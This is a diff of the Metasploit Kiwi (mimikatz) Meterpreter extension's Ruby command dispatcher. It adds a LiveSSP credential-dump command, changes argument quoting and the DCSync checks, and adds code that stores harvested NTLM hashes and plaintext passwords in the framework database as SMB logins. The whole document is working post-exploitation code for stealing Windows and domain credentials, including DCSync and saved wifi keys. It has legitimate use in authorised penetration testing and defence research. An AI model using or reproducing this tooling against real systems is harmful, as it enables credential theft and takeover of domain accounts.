@@ -8,7 +8,7 @@ module Ui
 
 ###
 #
-# Kiwi extension - grabs credentials from windows memory.
+# Kiwi extension - grabs credentials from windows memory (newer OSes).
 #
 # Benjamin DELPY `gentilkiwi`
 # http://blog.gentilkiwi.com/mimikatz
@@ -37,16 +37,16 @@ class Console::CommandDispatcher::Kiwi
   def initialize(shell)
     super
     print_line
-    print_line
-    print_line("  .#####.   mimikatz 2.1.1 20170608 (#{client.session_type})")
-    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\"")
-    print_line(" ## / \\ ##  /* * *")
-    print_line(" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
-    print_line(" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)")
-    print_line("  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */")
+    print_line("  .#####.   mimikatz 2.2.0 20191125 (#{client.session_type})")
+    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)")
+    print_line(" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
+    print_line(" ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")
+    print_line(" '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )")
+    print_line("  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/")
     print_line
 
-    if client.arch == ARCH_X86 and client.sys.config.sysinfo['Architecture'] == ARCH_X64
+    si = client.sys.config.sysinfo
+    if client.arch == ARCH_X86 && si['Architecture'] == ARCH_X64
       print_warning('Loaded x86 Kiwi on an x64 architecture.')
       print_line
     end
@@ -57,12 +57,13 @@ class Console::CommandDispatcher::Kiwi
   #
   def commands
     {
-      'kiwi_cmd'              => 'Execute an arbitary mimikatz command (unparsed)',
+      'kiwi_cmd'              => 'Execute an arbitrary mimikatz command (unparsed)',
       'dcsync'                => 'Retrieve user account information via DCSync (unparsed)',
       'dcsync_ntlm'           => 'Retrieve user account NTLM hash, SID and RID via DCSync',
       'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
       'creds_msv'             => 'Retrieve LM/NTLM creds (parsed)',
       'creds_ssp'             => 'Retrieve SSP creds',
+      'creds_livessp'         => 'Retrieve Live SSP creds',
       'creds_tspkg'           => 'Retrieve TsPkg creds (parsed)',
       'creds_kerberos'        => 'Retrieve Kerberos creds (parsed)',
       'creds_all'             => 'Retrieve all credentials (parsed)',
@@ -79,7 +80,10 @@ class Console::CommandDispatcher::Kiwi
   end
 
   def cmd_kiwi_cmd(*args)
-    output = client.kiwi.exec_cmd(args.join(' '))
+    # Kiwi expects instructions with arguments to be quoted so quote everything to be sure
+    # "You can pass instructions on mimikatz command line, those with arguments/spaces must be quoted."
+    # Quote from: https://github.com/gentilkiwi/mimikatz/wiki
+    output = client.kiwi.exec_cmd(args.map { |s| '"' + s + '"'}.join(' '))
     print_line(output)
   end
 
@@ -87,9 +91,9 @@ class Console::CommandDispatcher::Kiwi
   # Valid options for the password change feature
   #
   @@password_change_usage_opts = Rex::Parser::Arguments.new(
-    '-h'  => [false, 'Help banner'],
-    '-u'  => [true,  'User name of the password to change.'],
-    '-s'  => [true,  'Server to perform the action on (eg. Domain Controller).'],
+    '-h' => [false, 'Help banner'],
+    '-u' => [true,  'User name of the password to change.'],
+    '-s' => [true,  'Server to perform the action on (eg. Domain Controller).'],
     '-p' => [true,  'The known existing/old password (do not use with -n).'],
     '-n' => [true,  'The known existing/old hash (do not use with -p).'],
     '-P' => [true,  'The new password to set for the account (do not use with -N).'],
@@ -170,7 +174,7 @@ class Console::CommandDispatcher::Kiwi
   end
 
   def cmd_dcsync(*args)
-    return unless check_is_domain_user
+    check_is_domain_user
 
     if args.length != 1
       print_line('Usage: dcsync <DOMAIN\user>')
@@ -182,7 +186,7 @@ class Console::CommandDispatcher::Kiwi
   end
 
   def cmd_dcsync_ntlm(*args)
-    return unless check_is_domain_user
+    check_is_domain_user
 
     if args.length != 1
       print_line('Usage: dcsync_ntlm <DOMAIN\user>')
@@ -398,8 +402,7 @@ class Console::CommandDispatcher::Kiwi
   # Dump all the shared wifi profiles/credentials
   #
   def cmd_wifi_list_shared(*args)
-    interfaces_dir = '%AllUsersProfile%\Microsoft\Wlansvc\Profiles\Interfaces'
-    interfaces_dir = client.fs.file.expand_path(interfaces_dir)
+    interfaces_dir = client.sys.config.getenv('AllUsersProfile') + '\Microsoft\Wlansvc\Profiles\Interfaces'
     files = client.fs.file.search(interfaces_dir, '*.xml', true)
 
     if files.length == 0
@@ -489,6 +492,14 @@ class Console::CommandDispatcher::Kiwi
   end
 
   #
+  # Dump all LiveSSP credentials to screen.
+  #
+  def cmd_creds_livessp(*args)
+    method = Proc.new { client.kiwi.creds_livessp }
+    scrape_passwords('livessp', method, args)
+  end
+
+  #
   # Dump all TSPKG credentials to screen.
   #
   def cmd_creds_tspkg(*args)
@@ -530,7 +541,7 @@ protected
   end
 
 
-  def check_is_domain_user(msg='Running as SYSTEM, function will not work.')
+  def check_is_domain_user(msg='Running as SYSTEM; function will only work if this computer account has replication privileges (e.g. Domain Controller)')
     if client.sys.config.is_system?
       print_warning(msg)
       return false
@@ -608,6 +619,10 @@ protected
             values << ''
           end
         end
+        if !shell.framework.nil? && shell.framework.db.active
+          user, domain, secret = values
+          report_creds(k, user, domain, secret)
+        end
         table << values
       end
 
@@ -633,6 +648,70 @@ protected
     end
 
     return true
+  end
+
+  def report_smb_cred(credential_core)
+    # Assemble the options hash for creating the Metasploit::Credential::Login object
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      address: client.sock.peerhost,
+      port: 445,
+      service_name: 'smb',
+      protocol: 'tcp',
+      workspace_id: shell.framework.db.workspace.id
+    }
+
+    shell.framework.db.create_credential_login(login_data)
+  end
+
+  def create_cred(credential_data, domain = '')
+    unless domain.blank?
+      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
+      credential_data[:realm_value] = domain
+    end
+    credential_core = shell.framework.db.create_credential(credential_data)
+
+    credential_core
+  end
+
+  def report_creds(type, user, domain, secret)
+    if client&.db_record&.id.nil?
+      wlog('The session is not stored correctly in the database. Something went wrong.')
+      return
+    end
+
+    credential_data = {
+        origin_type: :session,
+        post_reference_name: 'kiwi',
+        private_data: nil,
+        private_type: nil,
+        session_id: client.db_record.id,
+        username: user,
+        workspace_id: shell.framework.db.workspace.id
+    }
+
+    return if (user.empty? || secret.eql?('(null)'))
+
+    case type
+    when :msv
+      ntlm_hash = secret.strip.downcase
+      if ntlm_hash != Metasploit::Credential::NTLMHash::BLANK_NT_HASH
+        ntlm_hash = "#{Metasploit::Credential::NTLMHash::BLANK_LM_HASH}:#{ntlm_hash}"
+        # Assemble data about the credential objects we will be creating
+        credential_data[:private_type] = :ntlm_hash
+        credential_data[:private_data] = ntlm_hash
+        credential_core = create_cred(credential_data, domain)
+        report_smb_cred(credential_core)
+      end
+    when :wdigest, :kerberos, :tspkg, :livessp, :ssp
+      # Assemble data about the credential objects we will be creating
+      credential_data[:private_type] = :password
+      credential_data[:private_data] = secret
+
+      credential_core = create_cred(credential_data, domain)
+      report_smb_cred(credential_core)
+    end
   end
 
   #
